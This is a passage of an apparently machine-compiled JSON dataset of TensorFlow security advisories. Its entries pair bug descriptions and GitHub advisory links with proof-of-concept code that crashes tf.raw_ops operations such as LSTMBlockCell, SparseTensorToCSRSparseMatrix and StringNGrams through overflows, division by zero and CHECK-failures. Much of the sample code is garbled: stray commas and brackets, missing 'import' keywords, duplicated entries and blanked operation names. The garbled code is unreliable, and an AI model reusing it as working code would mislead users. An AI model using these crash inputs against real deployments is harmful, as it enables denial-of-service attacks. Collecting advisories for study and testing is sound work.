    "Sample Code": "hypothesis_indices = tf.constant(-1250999896764, shape=[3, 3], dtype=tf.int64) \nhypothesis_values = tf.constant(0, shape=[3], dtype=tf.int64)\nhypothesis_shape = tf.constant(0, shape=[3], dtype=tf.int64)\n\ntruth_indices = tf.constant(-1250999896764, shape=[3, 3], dtype=tf.int64)\ntruth_values = tf.constant(2, shape=[3], dtype=tf.int64)\ntruth_shape = tf.constant(2, shape=[3], dtype=tf.int64) \n\ntf.raw_ops.EditDistance(\n  hypothesis_indices=hypothesis_indices,\n  hypothesis_values=hypothesis_values,\n  hypothesis_shape=hypothesis_shape,\n  truth_indices=truth_indices,\n  truth_values=truth_values,\n  ,\n  truth_shape=truth_shape)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-2r2f-g8mw-9gvr",
    "API Signature": "tf.raw_ops.EditDistance(\n    hypothesis_indices,\n    hypothesis_values,\n    hypothesis_shape,\n    truth_indices,\n    truth_values,\n    truth_shape,\n    normalize=True,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Integer overflow in `SpaceToBatchND`\n      ",
    "Bug description": "The implementation of  tf.raw_ops.SpaceToBatchND  (in all backends such as XLA and handwritten kernels) is vulnerable to an integer overflow:",
    "Sample Code": "input = tf.constant(-3.5e+35, shape=[10,19,22], dtype=tf.float32)\nblock_shape = tf.constant(-1879048192, shape=[2], dtype=tf.int64)\npaddings = tf.constant(0, shape=[2,2], dtype=tf.int32)\n)\ntf.raw_ops.SpaceToBatchND(input=input, block_shape=block_shape, paddings=paddings)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-jjm6-4vf7-cjh4",
    "API Signature": "tf.raw_ops.SpaceToBatchND(\n    input, block_shape, paddings, name=None\n)\n"
  },
  {
    "Title": "\n        Missing validation results in undefined behavior in `QuantizedConv2D`\n      ",
    "Bug description": "The implementation of  tf.raw_ops.QuantizedConv2D  does not fully validate the input arguments:",
    "Sample Code": "input = tf.constant(1, shape=[1, 2, 3, 3], dtype=tf.quint8)\nfilter = tf.constant(1, shape=[1, 2, 3, 3], dtype=tf.quint8)\n\n# bad args\nmin_input = tf.constant([], shape=[0], dtype=tf.float32)\nmax_input = tf.constant(0, shape=[], dtype=tf.float32)\nmin_filter = tf.constant(0, shape=[], dtype=tf.float32)\nmax_filter = tf.constant(0, shape=[], dtype=tf.float32)\n\ntf.raw_ops.QuantizedConv2D(\n  input=input,\n  filter=filter,\n  min_input=min_input,\n  max_input=max_input,\n  min_filter=min_filter,\n  max_filter=max_filter, \n  strides=[1, 1, 1, 1],\n  ],\n  padding=\"SAME\")",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-pqhm-4wvf-2jg8",
    "API Signature": "tf.raw_ops.QuantizedConv2D(\n    input,\n    filter,\n    min_input,\n    max_input,\n    min_filter,\n    max_filter,\n    strides,\n    padding,\n    out_type=tf.dtypes.qint32,\n    dilations=[1, 1, 1, 1],\n    name=None\n)\n"
  },
  {
    "Title": "\n        Missing validation results in undefined behavior in `SparseTensorDenseAdd\n      ",
    "Bug description": "The implementation of  tf.raw_ops.SparseTensorDenseAdd  does not fully validate the input arguments:",
    "Sample Code": "a_indices = tf.constant(0, shape=[17, 2], dtype=tf.int64)\na_values = tf.constant([], shape=[0], dtype=tf.float32)\na_shape = tf.constant([6, 12], shape=[2], dtype=tf.int64)\n\nb = tf.constant(-0.223668531, shape=[6, 12], dtype=tf.float32)\n\ntf.raw_ops.SparseTensorDenseAdd(\n    (\n    a_indices=a_indices, a_values=a_values, a_shape=a_shape, b=b)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-rc9w-5c64-9vqq",
    "API Signature": "tf.raw_ops.SparseTensorDenseAdd(\n    a_indices, a_values, a_shape, b, name=None\n)\n"
  },
  {
    "Title": "\n        Undefined behavior when users supply invalid resource handles\n      ",
    "Bug description": "Multiple TensorFlow operations misbehave in eager mode when the resource handle provided to them is invalid:",
    "Sample Code": " tensorflow as tf\n\ntf.summary.flush(writer=())",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5wpj-c6f7-24x8",
    "API Signature": "tf.raw_ops.QueueIsClosedV2(\n    handle, name=None\n)\n"
  },
  {
    "Title": "\n        Undefined behavior when users supply invalid resource handles\n      ",
    "Bug description": "Multiple TensorFlow operations misbehave in eager mode when the resource handle provided to them is invalid:",
    "Sample Code": " tensorflow as tf\n\ntf.summary.flush(writer=())",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5wpj-c6f7-24x8",
    "API Signature": "tf.summary.flush(\n    writer=None, name=None\n)\n"
  },
  {
    "Title": "\n        Missing validation causes denial of service via `Conv3DBackpropFilterV2`\n      ",
    "Bug description": "The implementation of  tf.raw_ops.Conv3DBackpropFilterV2  does not fully validate the input arguments. This results in a  CHECK -failure which can be used to trigger a denial of service attack:",
    "Sample Code": "tf.raw_ops.Conv3DBackpropFilterV2(\n  input=tf.constant(.5053710941, shape=[2,2,2,2,1], dtype=tf.float16),\n  filter_sizes=tf.constant(0, shape=[], dtype=tf.int32),\n  out_backprop=tf.constant(.5053710941, shape=[2,2,2,2,1], dtype=tf.float16),\n  strides=[1, 1, 1, 1, 1],\n  padding=\"VALID\",\n  data_format=\"NDHWC\",\n  ,\n  dilations=[1, 1, 1, 1, 1])",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5v77-j66x-4c4g",
    "API Signature": "tf.raw_ops.Conv3DBackpropFilterV2(\n    input,\n    filter_sizes,\n    out_backprop,\n    strides,\n    padding,\n    data_format='NDHWC',\n    dilations=[1, 1, 1, 1, 1],\n    name=None\n)\n"
  },
  {
    "Title": "\n        Missing validation causes denial of service via `LSTMBlockCell`\n      ",
    "Bug description": "The implementation of  tf.raw_ops.LSTMBlockCell  does not fully validate the input arguments. This results in a  CHECK -failure which can be used to trigger a denial of service attack:",
    "Sample Code": "tf.raw_ops.LSTMBlockCell( \n  x=tf.constant(0.837607, shape=[28,29], dtype=tf.float32),\n  cs_prev=tf.constant(0, shape=[28,17], dtype=tf.float32),\n  h_prev=tf.constant(0.592631638, shape=[28,17], dtype=tf.float32),\n  w=tf.constant(0.887386262, shape=[46,68], dtype=tf.float32),\n  wci=tf.constant(0, shape=[], dtype=tf.float32),\n  wcf=tf.constant(0, shape=[17], dtype=tf.float32),\n  wco=tf.constant(0.592631638, shape=[28,17], dtype=tf.float32),\n  b=tf.constant(0.75259006, shape=[68], dtype=tf.float32),\n  ),\n  forget_bias=1, cell_clip=0, use_peephole=False)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-2vv3-56qg-g2cf",
    "API Signature": "tf.raw_ops.LSTMBlockCell(\n    x,\n    cs_prev,\n    h_prev,\n    w,\n    wci,\n    wcf,\n    wco,\n    b,\n    forget_bias=1,\n    cell_clip=3,\n    use_peephole=False,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Missing validation causes denial of service via `LSTMBlockCell`\n      ",
    "Bug description": "The implementation of  tf.raw_ops.LSTMBlockCell  does not fully validate the input arguments. This results in a  CHECK -failure which can be used to trigger a denial of service attack:",
    "Sample Code": "tf.raw_ops.LSTMBlockCell( \n  x=tf.constant(0.837607, shape=[28,29], dtype=tf.float32),\n  cs_prev=tf.constant(0, shape=[28,17], dtype=tf.float32),\n  h_prev=tf.constant(0.592631638, shape=[28,17], dtype=tf.float32),\n  w=tf.constant(0.887386262, shape=[46,68], dtype=tf.float32),\n  wci=tf.constant(0, shape=[], dtype=tf.float32),\n  wcf=tf.constant(0, shape=[17], dtype=tf.float32),\n  wco=tf.constant(0.592631638, shape=[28,17], dtype=tf.float32),\n  b=tf.constant(0.75259006, shape=[68], dtype=tf.float32),\n  ),\n  forget_bias=1, cell_clip=0, use_peephole=False)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-2vv3-56qg-g2cf",
    "API Signature": "tf.raw_ops.LSTMBlockCell(\n    x,\n    cs_prev,\n    h_prev,\n    w,\n    wci,\n    wcf,\n    wco,\n    b,\n    forget_bias=1,\n    cell_clip=3,\n    use_peephole=False,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Missing validation causes denial of service via `LSTMBlockCell`\n      ",
    "Bug description": "The implementation of  tf.raw_ops.LSTMBlockCell  does not fully validate the input arguments. This results in a  CHECK -failure which can be used to trigger a denial of service attack:",
    "Sample Code": "tf.raw_ops.LSTMBlockCell( \n  x=tf.constant(0.837607, shape=[28,29], dtype=tf.float32),\n  cs_prev=tf.constant(0, shape=[28,17], dtype=tf.float32),\n  h_prev=tf.constant(0.592631638, shape=[28,17], dtype=tf.float32),\n  w=tf.constant(0.887386262, shape=[46,68], dtype=tf.float32),\n  wci=tf.constant(0, shape=[], dtype=tf.float32),\n  wcf=tf.constant(0, shape=[17], dtype=tf.float32),\n  wco=tf.constant(0.592631638, shape=[28,17], dtype=tf.float32),\n  b=tf.constant(0.75259006, shape=[68], dtype=tf.float32),\n  ),\n  forget_bias=1, cell_clip=0, use_peephole=False)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-2vv3-56qg-g2cf",
    "API Signature": "tf.raw_ops.LSTMBlockCell(\n    x,\n    cs_prev,\n    h_prev,\n    w,\n    wci,\n    wcf,\n    wco,\n    b,\n    forget_bias=1,\n    cell_clip=3,\n    use_peephole=False,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Missing validation causes denial of service via `LSTMBlockCell`\n      ",
    "Bug description": "The implementation of  tf.raw_ops.LSTMBlockCell  does not fully validate the input arguments. This results in a  CHECK -failure which can be used to trigger a denial of service attack:",
    "Sample Code": "tf.raw_ops.LSTMBlockCell( \n  x=tf.constant(0.837607, shape=[28,29], dtype=tf.float32),\n  cs_prev=tf.constant(0, shape=[28,17], dtype=tf.float32),\n  h_prev=tf.constant(0.592631638, shape=[28,17], dtype=tf.float32),\n  w=tf.constant(0.887386262, shape=[46,68], dtype=tf.float32),\n  wci=tf.constant(0, shape=[], dtype=tf.float32),\n  wcf=tf.constant(0, shape=[17], dtype=tf.float32),\n  wco=tf.constant(0.592631638, shape=[28,17], dtype=tf.float32),\n  b=tf.constant(0.75259006, shape=[68], dtype=tf.float32),\n  ),\n  forget_bias=1, cell_clip=0, use_peephole=False)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-2vv3-56qg-g2cf",
    "API Signature": "tf.raw_ops.LSTMBlockCell(\n    x,\n    cs_prev,\n    h_prev,\n    w,\n    wci,\n    wcf,\n    wco,\n    b,\n    forget_bias=1,\n    cell_clip=3,\n    use_peephole=False,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Missing validation causes denial of service via `LSTMBlockCell`\n      ",
    "Bug description": "The implementation of  tf.raw_ops.LSTMBlockCell  does not fully validate the input arguments. This results in a  CHECK -failure which can be used to trigger a denial of service attack:",
    "Sample Code": "tf.raw_ops.LSTMBlockCell( \n  x=tf.constant(0.837607, shape=[28,29], dtype=tf.float32),\n  cs_prev=tf.constant(0, shape=[28,17], dtype=tf.float32),\n  h_prev=tf.constant(0.592631638, shape=[28,17], dtype=tf.float32),\n  w=tf.constant(0.887386262, shape=[46,68], dtype=tf.float32),\n  wci=tf.constant(0, shape=[], dtype=tf.float32),\n  wcf=tf.constant(0, shape=[17], dtype=tf.float32),\n  wco=tf.constant(0.592631638, shape=[28,17], dtype=tf.float32),\n  b=tf.constant(0.75259006, shape=[68], dtype=tf.float32),\n  ),\n  forget_bias=1, cell_clip=0, use_peephole=False)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-2vv3-56qg-g2cf",
    "API Signature": "tf.raw_ops.LSTMBlockCell(\n    x,\n    cs_prev,\n    h_prev,\n    w,\n    wci,\n    wcf,\n    wco,\n    b,\n    forget_bias=1,\n    cell_clip=3,\n    use_peephole=False,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Missing validation causes denial of service via `LSTMBlockCell`\n      ",
    "Bug description": "The implementation of  tf.raw_ops.LSTMBlockCell  does not fully validate the input arguments. This results in a  CHECK -failure which can be used to trigger a denial of service attack:",
    "Sample Code": "tf.raw_ops.LSTMBlockCell( \n  x=tf.constant(0.837607, shape=[28,29], dtype=tf.float32),\n  cs_prev=tf.constant(0, shape=[28,17], dtype=tf.float32),\n  h_prev=tf.constant(0.592631638, shape=[28,17], dtype=tf.float32),\n  w=tf.constant(0.887386262, shape=[46,68], dtype=tf.float32),\n  wci=tf.constant(0, shape=[], dtype=tf.float32),\n  wcf=tf.constant(0, shape=[17], dtype=tf.float32),\n  wco=tf.constant(0.592631638, shape=[28,17], dtype=tf.float32),\n  b=tf.constant(0.75259006, shape=[68], dtype=tf.float32),\n  ),\n  forget_bias=1, cell_clip=0, use_peephole=False)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-2vv3-56qg-g2cf",
    "API Signature": "tf.raw_ops.LSTMBlockCell(\n    x,\n    cs_prev,\n    h_prev,\n    w,\n    wci,\n    wcf,\n    wco,\n    b,\n    forget_bias=1,\n    cell_clip=3,\n    use_peephole=False,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Missing validation causes denial of service via `LSTMBlockCell`\n      ",
    "Bug description": "The implementation of  tf.raw_ops.LSTMBlockCell  does not fully validate the input arguments. This results in a  CHECK -failure which can be used to trigger a denial of service attack:",
    "Sample Code": "tf.raw_ops.LSTMBlockCell( \n  x=tf.constant(0.837607, shape=[28,29], dtype=tf.float32),\n  cs_prev=tf.constant(0, shape=[28,17], dtype=tf.float32),\n  h_prev=tf.constant(0.592631638, shape=[28,17], dtype=tf.float32),\n  w=tf.constant(0.887386262, shape=[46,68], dtype=tf.float32),\n  wci=tf.constant(0, shape=[], dtype=tf.float32),\n  wcf=tf.constant(0, shape=[17], dtype=tf.float32),\n  wco=tf.constant(0.592631638, shape=[28,17], dtype=tf.float32),\n  b=tf.constant(0.75259006, shape=[68], dtype=tf.float32),\n  ),\n  forget_bias=1, cell_clip=0, use_peephole=False)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-2vv3-56qg-g2cf",
    "API Signature": "tf.raw_ops.LSTMBlockCell(\n    x,\n    cs_prev,\n    h_prev,\n    w,\n    wci,\n    wcf,\n    wco,\n    b,\n    forget_bias=1,\n    cell_clip=3,\n    use_peephole=False,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Missing validation causes denial of service via `LSTMBlockCell`\n      ",
    "Bug description": "The implementation of  tf.raw_ops.LSTMBlockCell  does not fully validate the input arguments. This results in a  CHECK -failure which can be used to trigger a denial of service attack:",
    "Sample Code": "tf.raw_ops.LSTMBlockCell( \n  x=tf.constant(0.837607, shape=[28,29], dtype=tf.float32),\n  cs_prev=tf.constant(0, shape=[28,17], dtype=tf.float32),\n  h_prev=tf.constant(0.592631638, shape=[28,17], dtype=tf.float32),\n  w=tf.constant(0.887386262, shape=[46,68], dtype=tf.float32),\n  wci=tf.constant(0, shape=[], dtype=tf.float32),\n  wcf=tf.constant(0, shape=[17], dtype=tf.float32),\n  wco=tf.constant(0.592631638, shape=[28,17], dtype=tf.float32),\n  b=tf.constant(0.75259006, shape=[68], dtype=tf.float32),\n  ),\n  forget_bias=1, cell_clip=0, use_peephole=False)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-2vv3-56qg-g2cf",
    "API Signature": "tf.raw_ops.LSTMBlockCell(\n    x,\n    cs_prev,\n    h_prev,\n    w,\n    wci,\n    wcf,\n    wco,\n    b,\n    forget_bias=1,\n    cell_clip=3,\n    use_peephole=False,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Missing validation causes denial of service via `SparseTensorToCSRSparseMatrix`\n      ",
    "Bug description": "The implementation of  tf.raw_ops.SparseTensorToCSRSparseMatrix  does not fully validate the input arguments. This results in a  CHECK -failure which can be used to trigger a denial of service attack:",
    "Sample Code": "indices = tf.constant(53, shape=[3], dtype=tf.int64)\nvalues = tf.constant(0.554979503, shape=[218650], dtype=tf.float32)\ndense_shape = tf.constant(53, shape=[3], dtype=tf.int64)\n    \ntf.raw_ops.SparseTensorToCSRSparseMatrix(\n  indices=indices,\n  values=values,\n  ,\n  dense_shape=dense_shape)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-mg66-qvc5-rm93",
    "API Signature": "tf.raw_ops.SparseTensorToCSRSparseMatrix(\n    indices, values, dense_shape, name=None\n)\n"
  },
  {
    "Title": "\n        Missing validation causes denial of service via `SparseTensorToCSRSparseMatrix`\n      ",
    "Bug description": "The implementation of  tf.raw_ops.SparseTensorToCSRSparseMatrix  does not fully validate the input arguments. This results in a  CHECK -failure which can be used to trigger a denial of service attack:",
    "Sample Code": "indices = tf.constant(53, shape=[3], dtype=tf.int64)\nvalues = tf.constant(0.554979503, shape=[218650], dtype=tf.float32)\ndense_shape = tf.constant(53, shape=[3], dtype=tf.int64)\n    \ntf.raw_ops.SparseTensorToCSRSparseMatrix(\n  indices=indices,\n  values=values,\n  ,\n  dense_shape=dense_shape)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-mg66-qvc5-rm93",
    "API Signature": "tf.raw_ops.SparseTensorToCSRSparseMatrix(\n    indices, values, dense_shape, name=None\n)\n"
  },
  {
    "Title": "\n        Missing validation causes denial of service via `LoadAndRemapMatrix`\n      ",
    "Bug description": "The implementation of  tf.raw_ops.LoadAndRemapMatrix  does not fully validate the input arguments. This results in a  CHECK -failure which can be used to trigger a denial of service attack:",
    "Sample Code": "ckpt_path = tf.constant(\n    \"/tmp/warm_starting_util_test5kl2a3pc/tmpph76tep2/model-0\", shape=[], dtype=tf.string)\nold_tensor_name = tf.constant(\n    \"/tmp/warm_starting_util_test5kl2a3pc/tmpph76tep2/model-0\", shape=[], dtype=tf.string)\n\nrow_remapping = tf.constant(0, shape=[], dtype=tf.int64)\ncol_remapping = tf.constant(3, shape=[3], dtype=tf.int64)\ninitializing_values = tf.constant([], shape=[0, 1], dtype=tf.float32)\n\ntf.raw_ops.LoadAndRemapMatrix(\n  ckpt_path=ckpt_path,\n  old_tensor_name=old_tensor_name,\n  row_remapping=row_remapping,\n  col_remapping=col_remapping,\n  initializing_values=initializing_values,\n  num_rows=1,\n  ,\n  num_cols=1)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-p9rc-rmr5-529j",
    "API Signature": "tf.raw_ops.LoadAndRemapMatrix(\n    ckpt_path,\n    old_tensor_name,\n    row_remapping,\n    col_remapping,\n    initializing_values,\n    num_rows,\n    num_cols,\n    max_rows_in_memory=-1,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Missing validation causes denial of service via `UnsortedSegmentJoin`\n      ",
    "Bug description": "The implementation of  tf.raw_ops.UnsortedSegmentJoin  does not fully validate the input arguments. This results in a  CHECK -failure which can be used to trigger a denial of service attack:",
    "Sample Code": "tf.raw_ops.UnsortedSegmentJoin(\n  inputs=tf.constant(\"this\", shape=[12], dtype=tf.string),\n  segment_ids=tf.constant(0, shape=[12], dtype=tf.int64),\n  ),\n  num_segments=tf.constant(0, shape=[12], dtype=tf.int64))",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-hrg5-737c-2p56",
    "API Signature": "tf.raw_ops.UnsortedSegmentJoin(\n    inputs, segment_ids, num_segments, separator='', name=None\n)\n"
  },
  {
    "Title": "\n        Missing validation causes denial of service via `StagePeek`\n      ",
    "Bug description": "The implementation of  tf.raw_ops.StagePeek  does not fully validate the input arguments. This results in a  CHECK -failure which can be used to trigger a denial of service attack:",
    "Sample Code": "index = tf.constant([], shape=[0], dtype=tf.int32)\n)\ntf.raw_ops.StagePeek(index=index, dtypes=[tf.int32])",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-h48f-q7rw-hvr7",
    "API Signature": "tf.raw_ops.StagePeek(\n    index,\n    dtypes,\n    capacity=0,\n    memory_limit=0,\n    container='',\n    shared_name='',\n    name=None\n)\n"
  },
  {
    "Title": "\n        Missing validation causes denial of service via `GetSessionTensor`\n      ",
    "Bug description": "The implementation of  tf.raw_ops.GetSessionTensor  does not fully validate the input arguments. This results in a  CHECK -failure which can be used to trigger a denial of service attack:",
    "Sample Code": "handle = tf.constant(\"[]\", shape=[0], dtype=tf.string)\n)\ntf.raw_ops.GetSessionTensor(handle=handle)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-fv25-wrff-wf86",
    "API Signature": "tf.raw_ops.GetSessionTensor(\n    handle, dtype, name=None\n)\n"
  },
  {
    "Title": "\n        Missing validation causes denial of service via `DeleteSessionTensor`\n      ",
    "Bug description": "The implementation of  tf.raw_ops.DeleteSessionTensor  does not fully validate the input arguments. This results in a  CHECK -failure which can be used to trigger a denial of service attack:",
    "Sample Code": "handle = tf.constant(\"[]\", shape=[0], dtype=tf.string)\n)\ntf.raw_ops.DeleteSessionTensor(handle=handle)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-h5g4-ppwx-48q2",
    "API Signature": "tf.raw_ops.DeleteSessionTensor(\n    handle, name=None\n)\n"
  },
  {
    "Title": "\n        Missing validation crashes `QuantizeAndDequantizeV4Grad`\n      ",
    "Bug description": "The implementation of  tf.raw_ops.QuantizeAndDequantizeV4Grad  does not fully validate the input arguments. This results in a  CHECK -failure which can be used to trigger a denial of service attack:",
    "Sample Code": "tf.raw_ops.QuantizeAndDequantizeV4Grad(\n  gradients=tf.constant(1, shape=[2,2], dtype=tf.float64),\n  input=tf.constant(1, shape=[2,2], dtype=tf.float64),\n  input_min=tf.constant([], shape=[0], dtype=tf.float64),\n  input_max=tf.constant(-10, shape=[], dtype=tf.float64),\n  ),\n  axis=-1)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-h2wq-prv9-2f56",
    "API Signature": "tf.raw_ops.QuantizeAndDequantizeV4Grad(\n    gradients, input, input_min, input_max, axis=-1, name=None\n)\n"
  },
  {
    "Title": "\n        Missing validation causes `TensorSummaryV2` to crash\n      ",
    "Bug description": "The implementation of  tf.raw_ops.TensorSummaryV2  does not fully validate the input arguments. This results in a  CHECK -failure which can be used to trigger a denial of service attack:",
    "Sample Code": "import tensorflow as tf\n\ntf.raw_ops.TensorSummaryV2(\n  tag=np.array('test'),\n  tensor=np.array(3),\n  ),\n  serialized_summary_metadata=tf.io.encode_base64(np.empty((0))))",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-2p9q-h29j-3f5v",
    "API Signature": null
  },
  {
    "Title": "\n        Missing validation causes `tf.sparse.split` to crash when `axis` is a tuple\n      ",
    "Bug description": "The implementation of  tf.sparse.split  does not fully validate the input arguments. Hence, a malicious user can trigger a denial of service via a segfault or a heap OOB read:",
    "Sample Code": "data = tf.random.uniform([1, 32, 32], dtype=tf.float32)\naxis = [1, 2]\nx = tf.sparse.from_dense(data)\n)\nresult = tf.sparse.split(x,3, axis=axis)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-43q8-3fv7-pr5x",
    "API Signature": "tf.sparse.split(\n    sp_input=None, num_split=None, axis=None, name=None\n)\n"
  },
  {
    "Title": "\n        Integer overflow leading to crash in `SparseCountSparseOutput`\n      ",
    "Bug description": "The  implementation of   can be made to crash a TensorFlow process by an integer overflow whose result is then used in a memory allocation:",
    "Sample Code": "import numpy as np\n    \ntf.raw_ops.SparseCountSparseOutput(\n  indices=[[1,1]],\n  values=[2],\n  dense_shape=[2 ** 31, 2 ** 32],\n  weights=[1],\n  binary_output=True,\n  minlength=-1,\n  maxlength=-1,\n  ,\n  name=None)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-x4qx-4fjv-hmw6",
    "API Signature": "tf.raw_ops.SparseCountSparseOutput(\n    indices,\n    values,\n    dense_shape,\n    weights,\n    binary_output,\n    minlength=-1,\n    maxlength=-1,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Reference binding to null pointer in `QuantizedMaxPool`\n      ",
    "Bug description": "The  implementation of   has an undefined behavior where user controlled inputs can trigger a reference binding to null pointer.",
    "Sample Code": "tf.raw_ops.QuantizedMaxPool(\n    input = tf.constant([[[[4]]]], dtype=tf.quint8),\n    min_input = [],\n    max_input = [1],\n    ksize = [1, 1, 1, 1],\n    strides = [1, 1, 1, 1],\n    padding = \"SAME\", name=None\n)\n)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-3mw4-6rj6-74g5",
    "API Signature": "tf.raw_ops.QuantizedMaxPool(\n    input, min_input, max_input, ksize, strides, padding, name=None\n)\n"
  },
  {
    "Title": "\n        Division by zero in `FractionalMaxPool`\n      ",
    "Bug description": "The  implementation of   can be made to crash a TensorFlow process via a division by 0:",
    "Sample Code": "import numpy as np\n\ntf.raw_ops.FractionalMaxPool(\n  value=tf.constant(value=[[[[1, 4, 2, 3]]]], dtype=tf.int64),\n  pooling_ratio=[1.0, 1.44, 1.73, 1.0],\n  pseudo_random=False,\n  overlapping=False,\n  deterministic=False,\n  seed=0,\n  seed2=0,\n  ,\n  name=None)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-87v6-crgm-2gfj",
    "API Signature": "tf.raw_ops.FractionalMaxPool(\n    value,\n    pooling_ratio,\n    pseudo_random=False,\n    overlapping=False,\n    deterministic=False,\n    seed=0,\n    seed2=0,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Integer overflows in `AddManySparseToTensorsMap`\n      ",
    "Bug description": "The  implementation of   is vulnerable to an integer overflow which results in a  CHECK -fail when building new  TensorShape  objects (so, an assert failure based denial of service):",
    "Sample Code": "import numpy as np\n\ntf.raw_ops.AddManySparseToTensorsMap(\n    sparse_indices=[(0,0),(0,1),(0,2),(4,3),(5,0),(5,1)],\n    sparse_values=[1,1,1,1,1,1],\n    sparse_shape=[2**32,2**32],\n    container='',\n    shared_name='',\n    ,\n    name=None)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-6445-fm66-fvq2",
    "API Signature": "tf.raw_ops.AddManySparseToTensorsMap(\n    sparse_indices,\n    sparse_values,\n    sparse_shape,\n    container='',\n    shared_name='',\n    name=None\n)\n"
  },
  {
    "Title": "\n        Integer overflows in most sparse component-wise ops\n      ",
    "Bug description": "The  implementations of   are vulnerable to integer overflows. These can be used to trigger large allocations (so, OOM based denial of service) or  CHECK -fails when building new  TensorShape  objects (so, assert failures based denial of service):",
    "Sample Code": "import numpy as np\n\ntf.raw_ops.SparseDenseCwiseDiv(\n    sp_indices=np.array([[9]]),\n    sp_values=np.array([5]),\n    sp_shape=np.array([92233720368., 92233720368]),\n    ]),\n    dense=np.array([4]))",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-rrx2-r989-2c43",
    "API Signature": "tf.raw_ops.SparseDenseCwiseDiv(\n    sp_indices, sp_values, sp_shape, dense, name=None\n)\n"
  },
  {
    "Title": "\n        Integer overflows in most sparse component-wise ops\n      ",
    "Bug description": "The  implementations of   are vulnerable to integer overflows. These can be used to trigger large allocations (so, OOM based denial of service) or  CHECK -fails when building new  TensorShape  objects (so, assert failures based denial of service):",
    "Sample Code": "import numpy as np\n\ntf.raw_ops.SparseDenseCwiseDiv(\n    sp_indices=np.array([[9]]),\n    sp_values=np.array([5]),\n    sp_shape=np.array([92233720368., 92233720368]),\n    ]),\n    dense=np.array([4]))",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-rrx2-r989-2c43",
    "API Signature": "tf.raw_ops.SparseDenseCwiseDiv(\n    sp_indices, sp_values, sp_shape, dense, name=None\n)\n"
  },
  {
    "Title": "\n        OOM due to integer overflow in `StringNGrams`\n      ",
    "Bug description": "The  implementation of   can be used to trigger a denial of service attack by causing an OOM condition after an integer overflow:",
    "Sample Code": "tf.raw_ops.StringNGrams(\n  data=['123456'],\n  data_splits=[0,1],\n  separator='a'*15,\n  ngram_widths=[],\n  left_pad='',\n  right_pad='',\n  pad_width=-5, \n  , \n  preserve_short_sequences=True)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-98j8-c9q4-r38g",
    "API Signature": "tf.raw_ops.StringNGrams(\n    data,\n    data_splits,\n    separator,\n    ngram_widths,\n    left_pad,\n    right_pad,\n    pad_width,\n    preserve_short_sequences,\n    name=None\n)\n"
  },
  {
    "Title": "\n        OOM in `ThreadPoolHandle`\n      ",
    "Bug description": "The  implementation of   can be used to trigger a denial of service attack by allocating too much memory:",
    "Sample Code": " tensorflow as tf\ny = tf.raw_ops.ThreadPoolHandle(num_threads=0x60000000,display_name='tf')",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c582-c96p-r5cq",
    "API Signature": "tf.raw_ops.ThreadPoolHandle(\n    num_threads,\n    display_name,\n    max_intra_op_parallelism=1,\n    container='',\n    shared_name='',\n    name=None\n)\n"
  },
  {
    "Title": "\n        Type confusion in shape inference for `ConcatV2`\n      ",
    "Bug description": "The  implementation of shape inference for   can be used to trigger a denial of service attack via a segfault caused by a type confusion:",
    "Sample Code": "@\ndef test():\n  y = tf.raw_ops.ConcatV2(\n    values=[[1,2,3],[4,5,6]],\n    axis = 0xb500005b)\n  return y\n\n\n\ntest()",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-m4hf-j54p-p353",
    "API Signature": "tf.raw_ops.ConcatV2(\n    values, axis, name=None\n)\n"
  },
  {
    "Title": "\n        Overflow and divide by zero in `UnravelIndex`\n      ",
    "Bug description": "The  implementation of   is vulnerable to a division by zero caused by an integer overflow bug:",
    "Sample Code": " tensorflow as tf\n\ntf.raw_ops.UnravelIndex(indices=-0x100000,dims=[0x100000,0x100000])",
